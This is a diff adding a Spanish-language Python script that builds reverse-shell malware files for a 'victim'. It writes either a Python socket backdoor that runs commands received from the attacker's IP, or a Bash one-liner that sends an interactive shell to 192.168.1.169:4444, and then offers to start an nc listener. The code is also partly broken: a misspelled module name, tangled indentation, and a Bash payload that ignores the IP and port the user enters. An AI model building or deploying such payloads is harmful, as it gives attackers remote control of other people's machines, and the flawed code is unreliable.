@@ -1,0 +1,134 @@
+import os
+
+path_malware = os.getcwd()+ '/malware_victima/'
+
+def clearScr():
+    os.system('clear')
+
+numero = int(input("""
+
+Escoja la opcion que desea 
+
+1: reverse shell en Python {.py}
+2: reverse shell en Bash {.sh}
+
+>  """))
+
+if numero == 1: 
+   ip = input("""
+   Introduzca su ip
+   
+   >  """)
+
+   modify_ip = "\'"+ ip +"\'"
+    
+   puerto = input("""
+   Introduzca un puerto {ejemplo: 4444}
+   
+   >  """)
+
+   malware = input("""
+
+   Nombre del archivo malicioso
+
+   >  """)
+
+
+   viruspy = "import socket\n"\
+             "import subprocess\n"\
+             "cliente = socket.socket()\n"\
+             "try:\n"\
+             "   cliente.connect(("+ modify_ip +","+ puerto +"))\n"\
+             "   cliente.send(\"shell > \".encode(\"ascii\"))\n"\
+             "   while True:\n"\
+             "       comandoBytes=cliente.recv(1024)\n"\
+             "       comandoCodificado=comandoBytes.decode(\"ascii\")\n"\
+             "       comando=subrocess.Popen(comandoCodificado,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n"\
+             "       cliente.send(comando.stdout.read())\n"\
+             "       cliente.send(\"shell > \".encode(\"ascii\"))\n"\
+             "except:\n"\
+             "    print(\"Has salido\")\n"\
+             "    pass"
+
+
+   with open(""+ path_malware +""+ malware +".py", "w")as f:
+      f.write(viruspy)
+   
+   option_listen = input("""
+   Ahora necesita abrir un listener en el puerto escogido para poder conecatarse cuando la victima ejecute el archivo.
+   
+   Quiere desplegar un listener?  [y/n] 
+   
+   >  """)
+
+def option_listener_yes(): 
+     clearScr()
+     print("No cierre esta terminal, cuando la victima habra el archivo se habrá conectado a la maquina remotamente.")
+     os.system('nc -nlvp '+ puerto +'')
+
+   
+     if option_listen == "y":
+         option_listener_yes()
+
+
+     if option_listen == "Y":
+         option_listener_yes()
+
+
+     else:
+        print("Sin listener no puedo conectarme al equipo victima :(")
+
+if numero == 2:
+   ip = input("""
+   Introduzca su ip
+   
+   >  """)
+    
+   puerto = input("""
+   Introduzca un puerto {ejemplo: 4444}
+   
+   >  """)
+   malware = input("""
+   Nombre del archivo malicioso
+   >  """)
+
+   virussh = "#!/bin/bash\n"\
+             "clear\n"\
+             "bash -i >& /dev/tcp/192.168.1.169/4444 0>&1"
+             
+   with open(""+ path_malware +""+ malware +".sh", "w")as f:
+      f.write(virussh)
+
+   
+   option_listen = input("""
+   Ahora necesita abrir un listener en el puerto escogido para poder conectarse cuando la victima ejecute el archivo.
+   
+   Quiere desplegar un listener?  [y/n]
+   
+   >  """)
+
+
+   if option_listen == "y":
+       option_listener_yes()
+
+   if option_listen == "Y":
+       option_listener_yes()
+
+   else:
+       print("""
+       Sin listener no puedo entrar al equipo victima :(
+
+       Puede poner el comando [nc -nlvp PUERTO ESCOGIDO] para abrir un listener.""")
+
+
+   
+
+   
+   
+   
+   
+   
+   
+   
+   
+  
